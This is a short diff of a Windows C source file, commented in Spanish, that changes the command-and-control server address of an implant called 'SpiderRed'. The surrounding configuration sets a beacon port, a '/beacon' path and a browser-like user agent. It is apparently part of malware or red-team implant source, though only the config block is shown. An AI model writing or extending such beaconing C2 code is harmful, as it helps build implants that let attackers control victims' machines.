@@ -24,7 +24,7 @@
 #pragma comment(lib, "psapi.lib")
 
 // ==================== CONFIGURACIÓN ====================
-#define C2_SERVER "192.168.1.100"  // IP del servidor C2-SpiderRed
+#define C2_SERVER "192.168.254.137"  // IP del servidor C2-SpiderRed
 #define C2_PORT 8443
 #define C2_PATH "/beacon"
 #define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SpiderRed-Agent/2.0"
